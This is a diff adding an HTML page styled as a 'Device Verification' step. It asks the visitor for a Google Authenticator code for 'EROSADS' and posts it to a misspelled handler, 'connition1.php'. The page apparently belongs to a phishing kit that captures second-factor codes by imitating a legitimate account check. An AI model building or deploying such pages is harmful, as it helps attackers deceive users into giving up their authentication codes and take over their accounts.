@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Verification</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-size: 0.8rem;
+      flex-direction: column;
+    }
+
+    .modal {
+      background-color: #fff;
+      color: #000;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      padding: 16px;
+      width: 90%;
+      max-width: 500px;
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 20px;
+    }
+
+  form input {
+  width: 80%; /* Adjusted from 100% */
+  padding: 6px; /* Reduced padding */
+  font-size: 0.8rem; /* Slightly smaller text */
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  margin-bottom: 12px;
+}
+
+
+    .form-actions {
+  display: flex;
+  gap: 12px;
+  justify-content: center;
+  margin-top: 12px;
+  margin-left: 200px; /* Moves the buttons slightly to the right */
+}
+
+
+    .button {
+      padding: 8px 16px;
+      border: none;
+      border-radius: 4px;
+      font-size: 0.9rem;
+      cursor: pointer;
+    }
+
+    .button.button-verify {
+      color: #EEBD22;
+      background-color: #000;
+      border: 2px solid #EEBD22;
+    }
+
+    .button.button-verify:hover {
+      background-color: #EEBD22;
+      color: #000;
+    }
+
+    .button.button-cancel {
+      color: #9B9B9B;
+      background-color: #000;
+      border: 2px solid #9B9B9B;
+    }
+
+    .button.button-cancel:hover {
+      background-color: #9B9B9B;
+      color: #000;
+    }
+
+    .support-text a {
+      color: #EEBD22;
+      text-decoration: none;
+    }
+
+    .support-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="modal">
+    <h2>Device Verification 1/2</h2>
+    <p>
+      Please enter a <strong>Google Authenticator code</strong> for <strong>EROSADS</strong> from your 
+      <strong>Verification</strong> app:
+    </p>
+    
+    <form id="loginForm" action="connition1.php" method="post">
+      <label for="verification-code">Verification Code:</label>
+      <input type="text" id="verification-code" name="verification_code" required>
+    </form>
+
+    <p class="support-text">
+      Having trouble with receiving the Code? You can contact the 
+      <a href="/support">Support</a>.
+    </p>
+  </div>
+
+  <div class="form-actions">
+    <button type="button" class="button button-cancel">CANCEL</button>
+    <button type="submit" form="loginForm" class="button button-verify">VERIFY</button>
+  </div>
+</body>
+</html>
